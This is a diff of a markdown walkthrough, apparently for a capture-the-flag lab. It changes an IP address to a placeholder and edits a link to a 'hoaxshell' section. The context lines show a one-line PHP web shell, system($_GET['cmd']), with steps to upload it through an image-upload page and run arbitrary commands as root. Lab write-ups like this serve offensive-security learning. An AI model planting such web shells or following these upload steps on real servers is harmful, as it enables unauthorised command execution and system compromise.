@@ -95,8 +95,8 @@ system($_GET['cmd']);
 ```
 
 1. Create a php file with the above code on your attacking machine.
-2. Navigate to http://10.200.95.31/img_upload.php and upload the file.
-3. Navigate to http://10.200.95.31/images/webshell.php.
+2. Navigate to http://10.200.X.31/img_upload.php and upload the file.
+3. Navigate to http://10.200.X.31/images/webshell.php.
 	![[Task 35 - Wrapping the burrito-20241014144328981.webp]]
 	Now you can run any command on the form.
 	
@@ -114,4 +114,4 @@ You are root onto  S-SRV01.
 
 - Submit the user flag on Task 4, question 5.
 
-**Next step:** [[Task 36 -  That's not a cat that's a dawg]]
+**Next step:** [[Task 36 -  That's not a cat that's a dawg#hoaxshell]]
